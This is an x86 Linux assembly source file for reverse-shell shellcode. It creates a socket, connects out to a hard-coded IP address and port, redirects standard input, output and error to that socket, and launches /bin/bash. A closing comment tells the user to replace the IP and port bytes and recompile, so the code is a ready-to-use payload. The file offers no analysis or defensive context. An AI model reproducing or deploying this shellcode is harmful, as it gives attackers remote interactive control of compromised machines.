global _start           
 
section .text
_start:
    jmp short call_shellcode
 
shellcode:
    xor eax, eax
    xor ebx, ebx
    xor ecx, ecx
 
    pop edx 
 
    push 0x6
    push 0x1
    push 0x2
 
    mov al, 0x66
    mov bl, 0x1
    mov ecx, esp
    int 0x80
 
    mov esi, eax
 
    xor eax, eax
    push eax
    push dword [edx+2]
    push word [edx]
    push word 0x2
    mov ecx, esp
    push 0x10
    push ecx
    push esi
    mov al, 0x66
    mov bl, 0x3
    mov ecx, esp
    int 0x80
 
    xor ecx, ecx
    mov cl, 0x3
 
loop:
    dec cl
    mov al, 0x3f
    mov ebx, esi
    int 0x80
 
    mov esi, eax
    jnz loop
 
    xor eax, eax
    xor ecx, ecx
    push ecx
    push 0x68736162
    push 0x2f6e6962
    push 0x2f2f2f2f
    mov ebx, esp
    push ecx
    push ebx
    mov al, 0xb
    mov ecx, esp
    xor edx, edx
    int 0x80
 
call_shellcode:
    call shellcode
    port: db 0x7a, 0x69, 0xc0, 0xa8, 0x0, 0x06 ;First 2 bytes are port and last 4 are IP. Please change these bytes to reflect your environment and recompile.